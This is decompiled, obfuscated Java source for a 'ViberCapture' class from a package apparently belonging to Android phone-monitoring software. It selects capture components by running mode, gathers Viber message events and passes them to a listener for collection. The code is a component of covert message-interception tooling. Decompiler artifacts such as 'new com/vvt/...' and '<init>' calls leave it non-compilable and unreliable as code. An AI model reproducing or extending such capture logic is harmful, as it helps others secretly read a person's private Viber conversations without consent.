package com.vvt.capture.viber;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.viber.mode.full.c;
import com.vvt.capture.viber.mode.full.i;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class b
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private String c;
  private com.vvt.base.capture.e d;
  private f e;
  private RunningMode f;
  private com.vvt.h.d g;
  private com.vvt.base.b h;
  
  public b(Context paramContext, String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, com.vvt.base.b paramb1)
  {
    this.c = paramString;
    this.b = parama;
    this.f = paramRunningMode;
    this.h = paramb1;
    Object localObject1 = RunningMode.FULL;
    boolean bool;
    Object localObject2;
    com.vvt.base.b localb;
    if (paramRunningMode != localObject1)
    {
      bool = true;
      localObject2 = new com/vvt/h/a;
      ((com.vvt.h.a)localObject2).<init>();
      localObject1 = ((com.vvt.h.a)localObject2).a(paramContext, bool);
      this.g = ((com.vvt.h.d)localObject1);
      localObject1 = this.f;
      localObject2 = RunningMode.FULL;
      if (localObject1 != localObject2) {
        break label166;
      }
      bool = a;
      if (bool) {}
      localObject1 = new com/vvt/capture/viber/mode/full/e;
      ((com.vvt.capture.viber.mode.full.e)localObject1).<init>();
      this.d = ((com.vvt.base.capture.e)localObject1);
      localObject1 = new com/vvt/capture/viber/mode/full/i;
      localObject2 = this.c;
      localb = this.h;
      ((i)localObject1).<init>((String)localObject2, localb);
      localObject2 = this.g;
      ((i)localObject1).a((com.vvt.h.d)localObject2);
      this.e = ((f)localObject1);
    }
    for (;;)
    {
      return;
      bool = false;
      localObject1 = null;
      break;
      label166:
      localObject1 = this.f;
      localObject2 = RunningMode.LIMITED_1;
      if (localObject1 == localObject2)
      {
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/capture/viber/mode/a/b;
        ((com.vvt.capture.viber.mode.a.b)localObject1).<init>(paramb);
        this.d = ((com.vvt.base.capture.e)localObject1);
        localObject1 = new com/vvt/capture/viber/mode/a/d;
        localObject2 = this.c;
        localb = this.h;
        ((com.vvt.capture.viber.mode.a.d)localObject1).<init>((String)localObject2, localb);
        localObject2 = this.g;
        ((com.vvt.capture.viber.mode.a.d)localObject1).a((com.vvt.h.d)localObject2);
        this.e = ((f)localObject1);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.h = paramb;
    boolean bool = a;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool2 = localObject instanceof d;
        if (bool2)
        {
          localObject = c.a((d)localObject);
          if (localObject != null)
          {
            int i = ((List)localObject).size();
            if (i > 0) {
              localArrayList.addAll((Collection)localObject);
            }
          }
        }
      }
      Object localObject = this.b;
      if (localObject != null)
      {
        bool1 = k();
        if (bool1)
        {
          bool1 = a;
          if (bool1) {}
          localObject = this.b;
          ((com.vvt.base.a)localObject).a(localArrayList);
        }
      }
    }
  }
  
  protected com.vvt.base.capture.e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "ViberCapture";
  }
  
  protected String e()
  {
    return this.c;
  }
  
  protected String f()
  {
    return "viber.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */